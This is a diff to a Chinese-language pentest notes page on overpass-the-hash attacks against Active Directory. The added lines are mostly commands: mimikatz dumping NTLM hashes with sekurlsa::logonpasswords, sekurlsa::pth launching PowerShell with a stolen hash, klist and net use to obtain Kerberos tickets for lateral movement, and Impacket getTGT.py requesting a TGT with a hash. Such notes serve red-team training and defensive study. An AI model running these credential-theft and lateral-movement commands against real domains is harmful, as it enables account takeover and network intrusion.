@@ -19,7 +19,17 @@ description: 适用于当前目标环境不允许使用NTLM进行身份验证 / 
 mimikatz.exe
 # 获取当前用户账户的NTLM哈希
 sekurlsa::logonpasswords
-# 
+# 利用输出信息中的NTLM字段中的哈希值进行接下来的绕过哈希攻击(此处指定运行powershell程序)
+sekurlsa::pth /user:用户名 /domain:target.com /ntlm:e3fh34..........4059hd /run:powershell.exe
+```
+
+```powershell
+# 检查缓存的Kerberos票据
+klist
+# 如果没有任何票据信息的输出，则意味着当前的用户没有向域控进行过身份验证，所以只要登录依次就可以了
+net use \\dc01
+klist
+# 从输出的票据中查看获取到的TGT/TGS票据，接下来可以横向移动了
 ```
 
 ### Impacket
@@ -27,10 +37,9 @@ sekurlsa::logonpasswords
 * 常用脚本：**getTGT.py**
 
 ```bash
-// Some code
+# [域名/用户名@域控]
+python3 getTGT.py target.com/administrator@dc01.target.com -hashes :e3fh34..........4059hd
 ```
-
-
 
 ## 攻击步骤
 
